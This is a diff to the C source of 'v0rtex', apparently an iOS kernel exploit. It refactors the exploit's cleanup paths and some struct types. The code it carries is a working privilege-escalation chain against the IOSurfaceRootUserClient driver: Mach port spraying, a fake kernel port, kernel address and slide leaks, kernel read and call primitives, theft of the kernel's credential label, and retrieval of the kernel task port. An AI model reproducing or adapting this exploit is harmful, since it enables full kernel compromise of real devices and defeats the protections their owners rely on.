@@ -422,8 +422,8 @@ typedef struct {
                 } waitq_queue;
             } waitq;
             kptr_t messages;
-            natural_t seqno;
-            natural_t receiver_name;
+            uint32_t seqno;
+            uint32_t receiver_name;
             uint16_t msgcount;
             uint16_t qlimit;
 #ifdef __LP64__
@@ -439,19 +439,19 @@ typedef struct {
     kptr_t ip_requests;
     kptr_t ip_premsg;
     uint64_t  ip_context;
-    natural_t ip_flags;
-    natural_t ip_mscount;
-    natural_t ip_srights;
-    natural_t ip_sorights;
+    uint32_t ip_flags;
+    uint32_t ip_mscount;
+    uint32_t ip_srights;
+    uint32_t ip_sorights;
 } kport_t;
 
 typedef struct {
     union {
         kptr_t port;
-        natural_t index;
+        uint32_t index;
     } notify;
     union {
-        natural_t name;
+        uint32_t name;
         kptr_t size;
     } name;
 } kport_request_t;
@@ -477,6 +477,19 @@ typedef union
     } b;
 } ktask_t;
 
+#define RELEASE_PORT(port) \
+do \
+{ \
+    if(MACH_PORT_VALID((port))) \
+    { \
+        _kernelrpc_mach_port_destroy_trap(self, (port)); \
+        port = MACH_PORT_NULL; \
+    } \
+} while(0)
+
+#define NUM_BEFORE  0x1000
+#define NUM_AFTER   0x100
+
 kern_return_t v0rtex(task_t *tfp0, kptr_t *kslide)
 {
     kern_return_t retval = KERN_FAILURE,
@@ -484,24 +497,26 @@ kern_return_t v0rtex(task_t *tfp0, kptr_t *kslide)
     task_t self = mach_task_self();
     host_t host = mach_host_self();
 
+    io_connect_t client = MACH_PORT_NULL;
+    mach_port_t realport = MACH_PORT_NULL;
+    mach_port_t before[NUM_BEFORE] = { MACH_PORT_NULL };
+    mach_port_t port = MACH_PORT_NULL;
+    mach_port_t after[NUM_AFTER] = { MACH_PORT_NULL };
+    mach_port_t fakeport = MACH_PORT_NULL;
+    mach_port_array_t maps = NULL;
+
     io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
     LOG("service: %x", service);
     if(!MACH_PORT_VALID(service))
     {
-        goto out0;
+        goto out;
     }
 
-    io_connect_t client = MACH_PORT_NULL;
     ret = IOServiceOpen(service, self, 0, &client);
     LOG("client: %x, %s", client, mach_error_string(ret));
-    if(ret != KERN_SUCCESS)
+    if(ret != KERN_SUCCESS || !MACH_PORT_VALID(client))
     {
-        goto out0;
-    }
-    if(!MACH_PORT_VALID(client))
-    {
-        ret = KERN_FAILURE;
-        goto out0;
+        goto out;
     }
 
     uint32_t dict_create[] =
@@ -530,15 +545,14 @@ kern_return_t v0rtex(task_t *tfp0, kptr_t *kslide)
     LOG("newSurface: %s", mach_error_string(ret));
     if(ret != KERN_SUCCESS)
     {
-        goto out1;
+        goto out;
     }
 
-    mach_port_t realport = MACH_PORT_NULL;
     ret = _kernelrpc_mach_port_allocate_trap(self, MACH_PORT_RIGHT_RECEIVE, &realport);
     LOG("realport: %x, %s", realport, mach_error_string(ret));
     if(ret != KERN_SUCCESS || !MACH_PORT_VALID(realport))
     {
-        goto out1;
+        goto out;
     }
 
     sched_yield();
@@ -547,44 +561,38 @@ kern_return_t v0rtex(task_t *tfp0, kptr_t *kslide)
     if(ret != KERN_SUCCESS)
     {
         LOG("mach_zone_force_gc: %s", mach_error_string(ret));
-        goto out1;
+        goto out;
     }
 
-#define NUM_BEFORE 0x1000
-    mach_port_t before[NUM_BEFORE] = { MACH_PORT_NULL };
     for(size_t i = 0; i < NUM_BEFORE; ++i)
     {
         ret = _kernelrpc_mach_port_allocate_trap(self, MACH_PORT_RIGHT_RECEIVE, &before[i]);
         if(ret != KERN_SUCCESS)
         {
             LOG("mach_port_allocate: %s", mach_error_string(ret));
-            goto out2;
+            goto out;
         }
     }
 
-    mach_port_t port = MACH_PORT_NULL;
     ret = _kernelrpc_mach_port_allocate_trap(self, MACH_PORT_RIGHT_RECEIVE, &port);
     if(ret != KERN_SUCCESS)
     {
         LOG("mach_port_allocate: %s", mach_error_string(ret));
-        goto out2;
+        goto out;
     }
     if(!MACH_PORT_VALID(port))
     {
         LOG("port: %x", port);
-        ret = KERN_FAILURE;
-        goto out2;
+        goto out;
     }
 
-#define NUM_AFTER 0x100
-    mach_port_t after[NUM_AFTER] = { MACH_PORT_NULL };
     for(size_t i = 0; i < NUM_AFTER; ++i)
     {
         ret = _kernelrpc_mach_port_allocate_trap(self, MACH_PORT_RIGHT_RECEIVE, &after[i]);
         if(ret != KERN_SUCCESS)
         {
             LOG("mach_port_allocate: %s", mach_error_string(ret));
-            goto out3;
+            goto out;
         }
     }
 
@@ -594,7 +602,7 @@ kern_return_t v0rtex(task_t *tfp0, kptr_t *kslide)
     LOG("mach_port_insert_right: %s", mach_error_string(ret));
     if(ret != KERN_SUCCESS)
     {
-        goto out3;
+        goto out;
     }
 
     // There seems to be some weird asynchronity with freeing on IOConnectCallAsyncStructMethod,
@@ -604,7 +612,7 @@ kern_return_t v0rtex(task_t *tfp0, kptr_t *kslide)
     LOG("mach_ports_register: %s", mach_error_string(ret));
     if(ret != KERN_SUCCESS)
     {
-        goto out3;
+        goto out;
     }
 
     uint64_t ref;
@@ -620,11 +628,11 @@ kern_return_t v0rtex(task_t *tfp0, kptr_t *kslide)
     LOG("mach_ports_register: %s", mach_error_string(ret));
     if(ret != KERN_SUCCESS)
     {
-        goto out3;
+        goto out;
     }
 
     // Prevent cleanup
-    mach_port_t fakeport = port;
+    fakeport = port;
     port = MACH_PORT_NULL;
 
 #define DATA_SIZE 0x1000
@@ -697,7 +705,7 @@ kern_return_t v0rtex(task_t *tfp0, kptr_t *kslide)
     if(ret != KERN_SUCCESS)
     {
         LOG("mach_zone_force_gc: %s", mach_error_string(ret));
-        goto out3;
+        goto out;
     }
 
     for(uint32_t i = 0; i < 0x2000; ++i)
@@ -718,7 +726,7 @@ kern_return_t v0rtex(task_t *tfp0, kptr_t *kslide)
         if(ret != KERN_SUCCESS)
         {
             LOG("setValue(%u): %s", i, mach_error_string(ret));
-            goto out3;
+            goto out;
         }
     }
 
@@ -727,14 +735,14 @@ kern_return_t v0rtex(task_t *tfp0, kptr_t *kslide)
     LOG("mach_port_get_context: 0x%016llx, %s", ctx, mach_error_string(ret));
     if(ret != KERN_SUCCESS)
     {
-        goto out3;
+        goto out;
     }
 
     uint32_t shift_mask = ctx >> 60;
     if(shift_mask < 1 || shift_mask > 3)
     {
         LOG("Invalid shift mask.");
-        goto out3;
+        goto out;
     }
     uint32_t shift_off = sizeof(kport_t) - (((shift_mask - 1) * 0x1000) % sizeof(kport_t));
 
@@ -778,7 +786,7 @@ kern_return_t v0rtex(task_t *tfp0, kptr_t *kslide)
     LOG("reallocate_buf: %s", mach_error_string(ret));
     if(ret != KERN_SUCCESS)
     {
-        goto out3;
+        goto out;
     }
 
     // Register realport on fakeport
@@ -787,7 +795,7 @@ kern_return_t v0rtex(task_t *tfp0, kptr_t *kslide)
     LOG("mach_port_request_notification(realport): %x, %s", notify, mach_error_string(ret));
     if(ret != KERN_SUCCESS)
     {
-        goto out3;
+        goto out;
     }
 
     uint32_t response[4 + (DATA_SIZE / sizeof(uint32_t))] = { 0 };
@@ -796,12 +804,12 @@ kern_return_t v0rtex(task_t *tfp0, kptr_t *kslide)
     LOG("getValue(%u): 0x%lx bytes, %s", idx, size, mach_error_string(ret));
     if(ret != KERN_SUCCESS)
     {
-        goto out3;
+        goto out;
     }
     if(size < DATA_SIZE + 0x10)
     {
         LOG("Response too short.");
-        goto out3;
+        goto out;
     }
 
     uint32_t fakeport_off = -1;
@@ -819,7 +827,7 @@ kern_return_t v0rtex(task_t *tfp0, kptr_t *kslide)
     if(!realport_addr)
     {
         LOG("Failed to leak realport address");
-        goto out3;
+        goto out;
     }
     LOG("realport addr: " ADDR, realport_addr);
     volatile kport_t *fakeport_buf = (volatile kport_t*)((uintptr_t)&dict[5] + fakeport_off);
@@ -830,7 +838,7 @@ kern_return_t v0rtex(task_t *tfp0, kptr_t *kslide)
     LOG("mach_port_request_notification(fakeport): %x, %s", notify, mach_error_string(ret));
     if(ret != KERN_SUCCESS)
     {
-        goto out3;
+        goto out;
     }
 
     size = sizeof(response);
@@ -838,18 +846,18 @@ kern_return_t v0rtex(task_t *tfp0, kptr_t *kslide)
     LOG("getValue(%u): 0x%lx bytes, %s", idx, size, mach_error_string(ret));
     if(ret != KERN_SUCCESS)
     {
-        goto out3;
+        goto out;
     }
     if(size < DATA_SIZE + 0x10)
     {
         LOG("Response too short.");
-        goto out3;
+        goto out;
     }
     kptr_t fakeport_addr = ((volatile kport_t*)((uintptr_t)&response[4] + fakeport_off))->ip_pdrequest;
     if(!realport_addr)
     {
         LOG("Failed to leak fakeport address");
-        goto out3;
+        goto out;
     }
     LOG("fakeport addr: " ADDR, fakeport_addr);
     kptr_t fake_addr = fakeport_addr - fakeport_off;
@@ -862,7 +870,7 @@ kern_return_t v0rtex(task_t *tfp0, kptr_t *kslide)
     LOG("reallocate_buf: %s", mach_error_string(ret));
     if(ret != KERN_SUCCESS)
     {
-        goto out3;
+        goto out;
     }
 
 #define KREAD(addr, buf, len) \
@@ -874,14 +882,14 @@ do \
         if(ret != KERN_SUCCESS) \
         { \
             LOG("mach_port_set_context: %s", mach_error_string(ret)); \
-            goto out3; \
+            goto out; \
         } \
         mach_msg_type_number_t outsz = 1; \
         ret = mach_port_get_attributes(self, fakeport, MACH_PORT_DNREQUESTS_SIZE, (mach_port_info_t)((uint32_t*)(buf) + i), &outsz); \
         if(ret != KERN_SUCCESS) \
         { \
             LOG("mach_port_get_attributes: %s", mach_error_string(ret)); \
-            goto out3; \
+            goto out; \
         } \
     } \
 } while(0)
@@ -891,7 +899,7 @@ do \
     LOG("itk_space: " ADDR, itk_space);
     if(!itk_space)
     {
-        goto out3;
+        goto out;
     }
 
     kptr_t self_task = 0;
@@ -899,7 +907,7 @@ do \
     LOG("self_task: " ADDR, self_task);
     if(!self_task)
     {
-        goto out3;
+        goto out;
     }
 
     kptr_t IOSurfaceRootUserClient_port = 0;
@@ -907,7 +915,7 @@ do \
     LOG("IOSurfaceRootUserClient port: " ADDR, IOSurfaceRootUserClient_port);
     if(!IOSurfaceRootUserClient_port)
     {
-        goto out3;
+        goto out;
     }
 
     kptr_t IOSurfaceRootUserClient_addr = 0;
@@ -915,7 +923,7 @@ do \
     LOG("IOSurfaceRootUserClient addr: " ADDR, IOSurfaceRootUserClient_addr);
     if(!IOSurfaceRootUserClient_addr)
     {
-        goto out3;
+        goto out;
     }
 
     kptr_t IOSurfaceRootUserClient_vtab = 0;
@@ -923,14 +931,14 @@ do \
     LOG("IOSurfaceRootUserClient vtab: " ADDR, IOSurfaceRootUserClient_vtab);
     if(!IOSurfaceRootUserClient_vtab)
     {
-        goto out3;
+        goto out;
     }
 
     kptr_t slide = IOSurfaceRootUserClient_vtab - OFFSET_IOSURFACEROOTUSERCLIENT_VTAB;
     LOG("slide: " ADDR, slide);
     if((slide % 0x100000) != 0)
     {
-        goto out3;
+        goto out;
     }
 #define OFF(name) (OFFSET_ ## name + slide)
 
@@ -938,7 +946,7 @@ do \
     LOG("mach_ports_register: %s", mach_error_string(ret));
     if(ret != KERN_SUCCESS)
     {
-        goto out3;
+        goto out;
     }
 
     kptr_t zone_map_addr = 0;
@@ -946,7 +954,7 @@ do \
     LOG("zone_map: " ADDR, zone_map_addr);
     if(!zone_map_addr)
     {
-        goto out3;
+        goto out;
     }
 
     kptr_t vtab[0x600 / sizeof(kptr_t)] = { 0 };
@@ -977,7 +985,7 @@ do \
     LOG("reallocate_buf: %s", mach_error_string(ret));
     if(ret != KERN_SUCCESS)
     {
-        goto out3;
+        goto out;
     }
 
     mach_vm_address_t shmem_addr = 0;
@@ -987,7 +995,7 @@ do \
     LOG("mach_vm_remap: %s", mach_error_string(ret));
     if(ret != KERN_SUCCESS)
     {
-        goto out3;
+        goto out;
     }
     LOG("shmem_addr: 0x%016llx", shmem_addr);
     fakeport_buf = (volatile kport_t*)(shmem_addr + fakeport_off);
@@ -1015,7 +1023,7 @@ do \
     if(numranges >= MAXRANGES) \
     { \
         LOG("FIND_RANGE(" #var "): ranges array too small"); \
-        goto out3; \
+        goto out; \
     } \
     for(int32_t i = 0; i < numranges; ++i) \
     { \
@@ -1032,7 +1040,7 @@ do \
     if(var + (uint32_t)(size) > DATA_SIZE) \
     { \
         LOG("FIND_RANGE(" #var ") out of range: 0x%x-0x%x", var, var + (uint32_t)(size)); \
-        goto out3; \
+        goto out; \
     } \
     ranges[numranges].start = var; \
     ranges[numranges].end = var + (uint32_t)(size); \
@@ -1082,7 +1090,7 @@ do \
     LOG("kernel_task addr: " ADDR ", %s", kernel_task_addr, errstr(r));
     if(r != 0 || !kernel_task_addr)
     {
-        goto out4;
+        goto out;
     }
 
     kptr_t kernproc_addr = 0;
@@ -1090,7 +1098,7 @@ do \
     LOG("kernproc addr: " ADDR ", %s", kernproc_addr, errstr(r));
     if(r != 0 || !kernproc_addr)
     {
-        goto out4;
+        goto out;
     }
 
     kptr_t kern_ucred = 0;
@@ -1098,7 +1106,7 @@ do \
     LOG("kern_ucred: " ADDR ", %s", kern_ucred, errstr(r));
     if(r != 0 || !kernproc_addr)
     {
-        goto out4;
+        goto out;
     }
 
     kptr_t self_proc = 0;
@@ -1106,7 +1114,7 @@ do \
     LOG("self_proc: " ADDR ", %s", self_proc, errstr(r));
     if(r != 0 || !kernproc_addr)
     {
-        goto out4;
+        goto out;
     }
 
     kptr_t self_ucred = 0;
@@ -1114,7 +1122,7 @@ do \
     LOG("self_ucred: " ADDR ", %s", self_ucred, errstr(r));
     if(r != 0 || !kernproc_addr)
     {
-        goto out4;
+        goto out;
     }
 
     KCALL(OFF(BCOPY), kern_ucred + OFFSET_UCRED_CR_LABEL, self_ucred + OFFSET_UCRED_CR_LABEL, sizeof(kptr_t), 0, 0, 0, 0);
@@ -1157,7 +1165,7 @@ do \
     LOG("kernel_map: " ADDR ", %s", km_task_buf->a.map, errstr(r));
     if(r != 0 || !km_task_buf->a.map)
     {
-        goto out4;
+        goto out;
     }
 
     kptr_t ipc_space_kernel = 0;
@@ -1165,7 +1173,7 @@ do \
     LOG("ipc_space_kernel: " ADDR ", %s", ipc_space_kernel, errstr(r));
     if(r != 0 || !ipc_space_kernel)
     {
-        goto out4;
+        goto out;
     }
 
 #ifdef __LP64__
@@ -1174,12 +1182,12 @@ do \
     LOG("zm_range: " ADDR "-" ADDR ", %s", zm_hdr.start, zm_hdr.end, errstr(r));
     if(r != 0 || !zm_hdr.start || !zm_hdr.end)
     {
-        goto out4;
+        goto out;
     }
     if(zm_hdr.end - zm_hdr.start > 0x100000000)
     {
         LOG("zone_map is too big, sorry.");
-        goto out4;
+        goto out;
     }
     kptr_t zm_tmp; // macro scratch space
 #   define ZM_FIX_ADDR(addr) \
@@ -1204,36 +1212,30 @@ do \
     LOG("copyin: %s", errstr(r));
     if(r != 0)
     {
-        goto out4;
+        goto out;
     }
-    mach_port_array_t maps = NULL;
     mach_msg_type_number_t mapsNum = 0;
     ret = mach_ports_lookup(self, &maps, &mapsNum);
     LOG("mach_ports_lookup: %s", mach_error_string(ret));
     if(ret != KERN_SUCCESS)
     {
-        goto out4;
+        goto out;
     }
     LOG("zone_map port: %x", maps[0]);
     LOG("kernel_map port: %x", maps[1]);
     if(!MACH_PORT_VALID(maps[0]) || !MACH_PORT_VALID(maps[1]))
     {
-        goto out4;
+        goto out;
     }
-    // Clean out refs right away
-    ret = mach_ports_register(self, NULL, 0);
-    LOG("mach_ports_register: %s", mach_error_string(ret));
-    if(ret != KERN_SUCCESS)
-    {
-        goto out5;
-    }
+    // Clean out the pointers without dropping refs
+    KCALL(OFF(BZERO), self_task + OFFSET_TASK_ITK_REGISTERED, sizeof(ptrs), 0, 0, 0, 0, 0);
 
     mach_vm_address_t remap_addr = 0;
     ret = mach_vm_remap(maps[1], &remap_addr, SIZEOF_TASK, 0, VM_FLAGS_ANYWHERE | VM_FLAGS_RETURN_DATA_ADDR, maps[0], kernel_task_addr, false, &cur, &max, VM_INHERIT_NONE);
     LOG("mach_vm_remap: %s", mach_error_string(ret));
     if(ret != KERN_SUCCESS)
     {
-        goto out5;
+        goto out;
     }
     LOG("remap_addr: 0x%016llx", remap_addr);
 
@@ -1241,7 +1243,7 @@ do \
     LOG("mach_vm_wire: %s", mach_error_string(ret));
     if(ret != KERN_SUCCESS)
     {
-        goto out5;
+        goto out;
     }
 
     kptr_t newport = ZM_FIX_ADDR(KCALL(OFF(IPC_PORT_ALLOC_SPECIAL), ipc_space_kernel, 0, 0, 0, 0, 0, 0));
@@ -1252,7 +1254,7 @@ do \
     LOG("copyin: %s", errstr(r));
     if(r != 0)
     {
-        goto out4;
+        goto out;
     }
 
     task_t kernel_task = MACH_PORT_NULL;
@@ -1260,48 +1262,37 @@ do \
     LOG("kernel_task: %x, %s", kernel_task, mach_error_string(ret));
     if(ret != KERN_SUCCESS || !MACH_PORT_VALID(kernel_task))
     {
-        goto out5;
+        goto out;
     }
 
     *tfp0 = kernel_task;
     *kslide = slide;
     retval = KERN_SUCCESS;
 
-out5:;
-    _kernelrpc_mach_port_destroy_trap(self, maps[0]);
-    _kernelrpc_mach_port_destroy_trap(self, maps[1]);
-out4:;
-    _kernelrpc_mach_port_destroy_trap(self, fakeport);
-out3:;
+out:;
+    LOG("Cleaning up...");
+    if(maps)
+    {
+        RELEASE_PORT(maps[0]);
+        RELEASE_PORT(maps[1]);
+    }
+    RELEASE_PORT(fakeport);
     for(size_t i = 0; i < NUM_AFTER; ++i)
     {
-        if(MACH_PORT_VALID(after[i]))
-        {
-            _kernelrpc_mach_port_destroy_trap(self, after[i]);
-            after[i] = MACH_PORT_NULL;
-        }
+        RELEASE_PORT(after[i]);
     }
-    if(MACH_PORT_VALID(port))
-    {
-        _kernelrpc_mach_port_destroy_trap(self, port);
-        port = MACH_PORT_NULL;
-    }
-out2:;
+    RELEASE_PORT(port);
     for(size_t i = 0; i < NUM_BEFORE; ++i)
     {
-        if(MACH_PORT_VALID(before[i]))
-        {
-            _kernelrpc_mach_port_destroy_trap(self, before[i]);
-            before[i] = MACH_PORT_NULL;
-        }
+        RELEASE_PORT(before[i]);
     }
-    if(MACH_PORT_VALID(realport))
+    RELEASE_PORT(realport);
+    RELEASE_PORT(client);
+
+    // Pass through error code, if existent
+    if(retval != KERN_SUCCESS && ret != KERN_SUCCESS)
     {
-        _kernelrpc_mach_port_destroy_trap(self, realport);
-        realport = MACH_PORT_NULL;
+        retval = ret;
     }
-out1:;
-    IOServiceClose(client);
-out0:;
     return retval;
 }
